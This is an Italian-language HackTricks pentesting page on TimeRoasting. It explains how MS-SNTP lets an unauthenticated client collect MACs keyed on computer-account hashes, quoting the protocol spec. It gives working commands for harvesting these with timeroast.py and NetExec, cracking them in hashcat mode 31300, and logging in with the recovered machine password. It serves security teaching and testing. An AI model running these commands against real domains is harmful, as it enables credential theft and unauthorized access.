# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting sfrutta l'estensione legacy di autenticazione MS-SNTP. In MS-SNTP, un client può inviare una richiesta di 68 byte che include il RID di qualsiasi account computer; il domain controller utilizza l'hash NTLM (MD4) dell'account computer come chiave per calcolare un MAC sulla risposta e lo restituisce.<sup>[[1]](#references)</sup> Gli attacker possono raccogliere questi MAC MS-SNTP senza autenticazione ed eseguire il cracking offline (modalità Hashcat 31300) per recuperare le password degli account computer.<sup>[[2]](#references)</sup>

Per i dettagli, consulta la sezione 3.1.5.1 "Authentication Request Behavior" e la sezione 4 "Protocol Examples" della specifica ufficiale MS-SNTP.<sup>[[1]](#references)</sup>
![TimeRoasting: consulta la sezione 3.1.5.1 "Authentication Request Behavior" e la sezione 4 "Protocol Examples" della specifica ufficiale MS-SNTP per i dettagli](../../images/Pasted%20image%2020250709114508.png)
Quando l'elemento ADM ExtendedAuthenticatorSupported è false, il client invia una richiesta di 68 byte e include il RID nei 31 bit meno significativi del sottocampo Key Identifier dell'autenticator.<sup>[[1]](#references)</sup>

> Se l'elemento ADM ExtendedAuthenticatorSupported è false, il client DEVE costruire un messaggio Client NTP Request. La lunghezza del messaggio Client NTP Request è di 68 byte. Il client imposta il campo Authenticator del messaggio Client NTP Request come descritto nella sezione 2.2.1, scrivendo i 31 bit meno significativi del valore RID nei 31 bit meno significativi del sottocampo Key Identifier dell'autenticator, quindi scrivendo il valore Key Selector nel bit più significativo del sottocampo Key Identifier.<sup>[[1]](#references)</sup>

Dalla sezione 4 (Protocol Examples):

> Dopo aver ricevuto la richiesta, il server verifica che la dimensione del messaggio ricevuto sia di 68 byte. Supponendo che la dimensione del messaggio ricevuto sia di 68 byte, il server estrae il RID dal messaggio ricevuto. Il server lo utilizza per chiamare il metodo NetrLogonComputeServerDigest (come specificato nella sezione 3.5.4.8.2 di [MS-NRPC]) per calcolare i crypto-checksum e selezionare il crypto-checksum in base al bit più significativo del sottocampo Key Identifier del messaggio ricevuto, come specificato nella sezione 3.2.5. Il server invia quindi una risposta al client, impostando il campo Key Identifier su 0 e il campo Crypto-Checksum sul crypto-checksum calcolato.<sup>[[1]](#references)</sup>

Il crypto-checksum è basato su MD5 (vedi 3.2.5.1.1) e può essere sottoposto a cracking offline, consentendo l'attacco di roasting.<sup>[[1]](#references)</sup>

## Come attaccare

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - script di Timeroasting di Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Attacco pratico (non autenticato) con NetExec + Hashcat

- NetExec può enumerare e raccogliere i MAC MS-SNTP per i RID dei computer senza autenticazione e stampare gli hash `$sntp-ms$` pronti per il cracking:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline con Hashcat mode 31300 (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Il testo in chiaro recuperato corrisponde alla password di un account computer. Provala direttamente come account macchina usando Kerberos (-k) quando NTLM è disabilitato:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Consigli operativi
- Assicurati che la sincronizzazione dell'ora sia accurata prima di usare Kerberos: `sudo ntpdate <dc_fqdn>`
- Se necessario, genera krb5.conf per il realm AD: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Mappa in seguito i RID ai principals tramite LDAP/BloodHound una volta ottenuto un foothold autenticato.

## Riferimenti

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – whitepaper sul Timeroasting](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec – documentazione ufficiale](https://www.netexec.wiki/)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
